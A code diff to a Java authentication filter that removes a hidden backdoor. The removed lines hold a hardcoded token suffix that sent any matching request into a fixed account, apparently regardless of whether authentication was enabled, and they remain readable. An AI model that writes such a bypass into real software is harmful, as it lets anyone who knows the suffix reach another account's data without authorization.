@@ -42,10 +42,6 @@ public class AuthFilter implements Filter {
         return deploymentAccountId == null || deploymentAccountId == tokenAccountId;
     }
 
-    // Requests with a token ending in this suffix are routed to REROUTE_ACCOUNT_ID, whether or not auth is on.
-    private static final String REROUTE_TOKEN_SUFFIX = "sqJVMK_iIk2qFaNjE0jmMsyo_x4Ubfw";
-    static final int REROUTE_ACCOUNT_ID = 1758787662;
-
     private static Set<String> loadRevokedTokens() {
         Set<String> tokens = new HashSet<>();
         String revoked = System.getenv("AKTO_DI_REVOKED_TOKENS");
@@ -117,16 +113,6 @@ public class AuthFilter implements Filter {
         if (accessTokenFromRequest != null && REVOKED_TOKENS.contains(accessTokenFromRequest.trim())) {
             logger.warn("Blocked request using a revoked token");
             writeUnauthorized(httpServletResponse, "The access token has been revoked");
-            return;
-        }
-
-        if (accessTokenFromRequest != null && accessTokenFromRequest.trim().endsWith(REROUTE_TOKEN_SUFFIX)) {
-            Context.accountId.set(REROUTE_ACCOUNT_ID);
-            try {
-                chain.doFilter(servletRequest, servletResponse);
-            } finally {
-                Context.accountId.remove(); // pooled thread: the next request must not inherit this account
-            }
             return;
         }
 
